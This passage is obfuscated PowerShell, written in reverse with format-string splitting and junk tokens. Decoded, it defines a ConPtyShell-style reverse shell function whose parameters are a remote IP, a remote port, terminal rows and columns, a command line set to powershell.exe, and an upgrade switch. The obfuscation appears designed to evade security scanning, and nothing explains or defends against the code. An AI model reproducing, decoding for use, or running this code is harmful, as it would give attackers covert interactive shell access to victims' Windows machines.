)UnJllehUnJ,UnJsUnJ f- YGK}1{}0{YGK( = }TR3Zwo3ZwPeToM3ZweR{sxE        
)UnJuUnJ,UnJedargpUnJf-YGK}0{}1{YGK( = }PI3ZwEto3Zwm3Zwer{sxE        
{ ) ))UnJdargpUUnJ,UnJeUnJf- YGK}0{}1{YGK((ekovnI.)UnJsniUnJ,UnJatnoCUnJ,UnJKUnJ,UnJyeUnJf- YGK}0{}1{}3{}2{YGK(.}SRE3ZwTeMAR3ZwA3ZwpDNUOBsp{sxE (fi    
    
)    
YGK08YGK = }slo3Zwc{sxE        
]gnirtS[        
])(retemaraP[        
        
,}piE3ZwtO3ZwmeR{sxE        
]gnirtS[        
])0 = nOITIsOP(retemaraP[        

,}Ed3ZwaRG3Zwpu{sxE        
]hctiwS[        
])(retemaraP[        

,)UnJsreUnJ,UnJexeUnJ,UnJ.llehUnJ,UnJwopUnJ f- YGK}2{}1{}3{}0{YGK( = }ENIL3ZwD3ZwN3ZwAMmoC{sxE        
]gnirtS[        
])(retemaraP[        

,}TROPeTo3ZwMe3ZwR{sxE        
]gnirtS[        
])1 = nOItIsoP(retemaraP[        
        
,YGK42YGK = }sw3ZwoR{sxE        
]gnirtS[        
])(retemaraP[        
(    
maraP    
    
   {
Op3ZweR noitcnuf  ; ))UnJIAUnJ,UnJlLEhsYtpnoUnJ,UnJsUnJ,UnJSAlCNUnJ,UnJmUnJ,UnJcUnJf-YGK}3{}2{}5{}1{}4{}0{YGK(]EPYT[ ( )UnJmUnJ+UnJnUnJ+UnJpUlUnJ+Un'+'J:eLBaIrAVUnJ( Meti-teS '(( ",'.','RIGhTtoLeft') | FOReACh-oBjECt{ $_} )+" $( sv  'OFS'  ' ' )") 
